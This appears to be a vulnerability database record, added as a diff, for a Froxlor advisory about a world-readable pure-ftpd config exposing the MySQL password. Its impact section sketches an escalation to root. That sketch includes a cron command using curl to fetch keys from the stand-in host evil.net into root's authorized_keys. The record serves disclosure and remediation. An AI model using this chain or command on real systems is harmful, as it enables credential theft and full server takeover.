@@ -1,0 +1,174 @@
+advisory_id: GHSA-34qg-65m4-f23m
+datasource_id: github_osv/GHSA-34qg-65m4-f23m
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-34qg-65m4-f23m/GHSA-34qg-65m4-f23m.json
+aliases: []
+summary: |
+  Froxlor: /etc/pure-ftpd/db/mysql.conf is chmod 644 but contains <SQL_UNPRIVILEGED_PASSWORD>
+  ### Summary
+  In Froxlor 2.1.9 and in the HEADs of the `main`, `v2.2` and `v2.1` branches , the XML templates in `lib/configfiles/` set `chmod 644` for `/etc/pure-ftpd/db/mysql.conf`, although that file contains `<SQL_UNPRIVILEGED_PASSWORD>`. At least on Debian 12, all parent directories of `/etc/pure-ftpd/db/mysql.conf` are world readable by default, thus exposing these credentials to all users with access to the system. Only Froxlor instances configured to use pure-ftpd are affected/vulnerable.
+
+  ### Details
+  https://github.com/froxlor/Froxlor/blob/2.1.9/lib/configfiles/bookworm.xml#L3075
+
+  ### PoC
+  As non-privileged user:
+  ```
+  nobody@mail:/tmp$ grep MYSQLPassword /etc/pure-ftpd/db/mysql.conf
+  MYSQLPassword   MySecretMySQLPasswordForFroxlor
+  ```
+
+
+  ### Impact
+  Any unprivileged user with "command/code execution" access to the system can trivially obtain the credentials granting access to the `froxlor` MySQL database. This holds true even for virtual users without SSH access as long as they are able to upload their own PHP scripts or other CGIs, and works even if the admin has setup a separate php-fpm pool that runs as their own user.
+
+  Side note: This access to the database can be leveraged to obtain Froxlor admin privileges, and subsequently root privileges. For example:
+  1. Use the database credentials to extract or change a Froxlor admin's password hash and TOTP seed value.
+  2. Log into Froxlor as that admin.
+  3. Set the `Cron-daemon reload command` in `/admin_settings.php?page=overview&part=crond` to something like `curl -o /root/.ssh/authorized_keys evil.net`.
+  4. Wait a few minutes until the relevant cronjob runs, then log in via SSH.
+
+
+  Please consider using passwordless unix socket authentication. Current versions of MySQL, MariaDB and Percona allow completely removing/omitting database passwords for database connections going through a unix socket, this works even for use cases where the database user has a different name than the system account running the database client:
+  https://dev.mysql.com/doc/refman/5.7/en/socket-pluggable-authentication.html
+impacted_packages:
+  - purl: pkg:composer/froxlor/froxlor
+    affected_versions: vers:composer/<=2.2.0-rc3
+    fixed_versions: vers:composer/2.2.0
+    affected_packages:
+      - pkg:composer/froxlor/froxlor@0.10.0-rc1
+      - pkg:composer/froxlor/froxlor@0.10.0-rc2
+      - pkg:composer/froxlor/froxlor@0.10.0
+      - pkg:composer/froxlor/froxlor@0.10.1
+      - pkg:composer/froxlor/froxlor@0.10.2
+      - pkg:composer/froxlor/froxlor@0.10.3
+      - pkg:composer/froxlor/froxlor@0.10.4
+      - pkg:composer/froxlor/froxlor@0.10.5
+      - pkg:composer/froxlor/froxlor@0.10.6
+      - pkg:composer/froxlor/froxlor@0.10.7
+      - pkg:composer/froxlor/froxlor@0.10.8
+      - pkg:composer/froxlor/froxlor@0.10.9
+      - pkg:composer/froxlor/froxlor@0.10.10
+      - pkg:composer/froxlor/froxlor@0.10.11
+      - pkg:composer/froxlor/froxlor@0.10.12
+      - pkg:composer/froxlor/froxlor@0.10.13
+      - pkg:composer/froxlor/froxlor@0.10.14
+      - pkg:composer/froxlor/froxlor@0.10.15
+      - pkg:composer/froxlor/froxlor@0.10.16
+      - pkg:composer/froxlor/froxlor@0.10.17
+      - pkg:composer/froxlor/froxlor@0.10.18
+      - pkg:composer/froxlor/froxlor@0.10.19
+      - pkg:composer/froxlor/froxlor@0.10.20
+      - pkg:composer/froxlor/froxlor@0.10.21
+      - pkg:composer/froxlor/froxlor@0.10.22
+      - pkg:composer/froxlor/froxlor@0.10.23
+      - pkg:composer/froxlor/froxlor@0.10.23%2B1
+      - pkg:composer/froxlor/froxlor@0.10.24
+      - pkg:composer/froxlor/froxlor@0.10.25
+      - pkg:composer/froxlor/froxlor@0.10.26
+      - pkg:composer/froxlor/froxlor@0.10.27
+      - pkg:composer/froxlor/froxlor@0.10.28
+      - pkg:composer/froxlor/froxlor@0.10.29
+      - pkg:composer/froxlor/froxlor@0.10.29%2B1
+      - pkg:composer/froxlor/froxlor@0.10.30
+      - pkg:composer/froxlor/froxlor@0.10.31
+      - pkg:composer/froxlor/froxlor@0.10.32
+      - pkg:composer/froxlor/froxlor@0.10.33
+      - pkg:composer/froxlor/froxlor@0.10.34
+      - pkg:composer/froxlor/froxlor@0.10.34%2B1
+      - pkg:composer/froxlor/froxlor@0.10.35
+      - pkg:composer/froxlor/froxlor@0.10.35%2B1
+      - pkg:composer/froxlor/froxlor@0.10.36
+      - pkg:composer/froxlor/froxlor@0.10.37
+      - pkg:composer/froxlor/froxlor@0.10.38
+      - pkg:composer/froxlor/froxlor@0.10.38%2B1
+      - pkg:composer/froxlor/froxlor@0.10.38%2B2
+      - pkg:composer/froxlor/froxlor@0.10.38%2B3
+      - pkg:composer/froxlor/froxlor@2.0.0
+      - pkg:composer/froxlor/froxlor@2.0.1
+      - pkg:composer/froxlor/froxlor@2.0.2
+      - pkg:composer/froxlor/froxlor@2.0.3
+      - pkg:composer/froxlor/froxlor@2.0.4
+      - pkg:composer/froxlor/froxlor@2.0.5
+      - pkg:composer/froxlor/froxlor@2.0.6
+      - pkg:composer/froxlor/froxlor@2.0.7
+      - pkg:composer/froxlor/froxlor@2.0.8
+      - pkg:composer/froxlor/froxlor@2.0.9
+      - pkg:composer/froxlor/froxlor@2.0.10
+      - pkg:composer/froxlor/froxlor@2.0.11
+      - pkg:composer/froxlor/froxlor@2.0.12
+      - pkg:composer/froxlor/froxlor@2.0.13
+      - pkg:composer/froxlor/froxlor@2.0.14
+      - pkg:composer/froxlor/froxlor@2.0.15
+      - pkg:composer/froxlor/froxlor@2.0.16
+      - pkg:composer/froxlor/froxlor@2.0.17
+      - pkg:composer/froxlor/froxlor@2.0.18
+      - pkg:composer/froxlor/froxlor@2.0.19
+      - pkg:composer/froxlor/froxlor@2.0.20
+      - pkg:composer/froxlor/froxlor@2.0.21
+      - pkg:composer/froxlor/froxlor@2.0.22
+      - pkg:composer/froxlor/froxlor@2.0.23
+      - pkg:composer/froxlor/froxlor@2.0.24
+      - pkg:composer/froxlor/froxlor@2.1.0-beta1
+      - pkg:composer/froxlor/froxlor@2.1.0-beta2
+      - pkg:composer/froxlor/froxlor@2.1.0-rc1
+      - pkg:composer/froxlor/froxlor@2.1.0-rc2
+      - pkg:composer/froxlor/froxlor@2.1.0-rc3
+      - pkg:composer/froxlor/froxlor@2.1.0
+      - pkg:composer/froxlor/froxlor@2.1.1
+      - pkg:composer/froxlor/froxlor@2.1.2
+      - pkg:composer/froxlor/froxlor@2.1.3
+      - pkg:composer/froxlor/froxlor@2.1.4
+      - pkg:composer/froxlor/froxlor@2.1.5
+      - pkg:composer/froxlor/froxlor@2.1.6
+      - pkg:composer/froxlor/froxlor@2.1.7
+      - pkg:composer/froxlor/froxlor@2.1.8
+      - pkg:composer/froxlor/froxlor@2.1.9
+      - pkg:composer/froxlor/froxlor@2.2.0-rc1
+      - pkg:composer/froxlor/froxlor@2.2.0-rc2
+      - pkg:composer/froxlor/froxlor@2.2.0-rc3
+    fixed_packages:
+      - pkg:composer/froxlor/froxlor@2.2.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/froxlor/froxlor
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/froxlor/froxlor
+        commit: 5d2ce4ecfb0e9c397ef5c73b107fb9a0e122e910
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-34qg-65m4-f23m/GHSA-34qg-65m4-f23m.json
+  - score: '8.4'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-34qg-65m4-f23m/GHSA-34qg-65m4-f23m.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-732
+references:
+  - url: https://github.com/froxlor/Froxlor
+    reference_type:
+    reference_id:
+  - url: https://github.com/froxlor/Froxlor/blob/2.1.9/lib/configfiles/bookworm.xml#L3075
+    reference_type:
+    reference_id:
+  - url: https://github.com/froxlor/Froxlor/commit/5d2ce4ecfb0e9c397ef5c73b107fb9a0e122e910
+    reference_type:
+    reference_id:
+  - url: https://github.com/froxlor/Froxlor/security/advisories/GHSA-34qg-65m4-f23m
+    reference_type:
+    reference_id: GHSA-34qg-65m4-f23m
+exploits: []
